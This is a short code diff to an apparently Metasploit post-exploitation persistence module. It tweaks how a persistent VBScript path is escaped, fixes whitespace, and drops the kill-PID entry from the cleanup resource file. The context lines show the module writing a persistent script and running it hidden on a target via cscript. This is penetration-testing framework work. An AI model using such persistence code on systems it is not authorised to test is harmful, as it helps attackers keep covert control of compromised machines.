@@ -149,7 +149,7 @@ class Metasploit3 < Msf::Post
     end
 
     clean_rc = log_file()
-    file_local_write(clean_rc,@clean_up_rc)
+    file_local_write(clean_rc, @clean_up_rc)
     print_status("Cleanup Meterpreter RC File: #{clean_rc}")
 
     report_note(:host => host,
@@ -265,6 +265,7 @@ class Metasploit3 < Msf::Post
     fd.write(vbs)
     fd.close
     print_good("Persistent Script written to #{tempvbs}")
+    tempvbs = tempvbs.gsub(/\\/, '//')      # Escape windows pathname separators.
     @clean_up_rc << "rm #{tempvbs}\n"
     return tempvbs
   end
@@ -326,7 +327,6 @@ class Metasploit3 < Msf::Post
     : session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
 
     print_good("Agent executed with PID #{proc.pid}")
-    @clean_up_rc << "kill #{proc.pid}\n"
     return proc.pid
   end
 
@@ -367,6 +367,7 @@ class Metasploit3 < Msf::Post
     fd.write(vbs)
     fd.close
     print_good("Persistent Script written to #{tempvbs}")
+    tempvbs = tempvbs.gsub(/\\/, '//')      # Escape windows pathname separators.
     @clean_up_rc << "rm #{tempvbs}\n"
     return tempvbs
   end
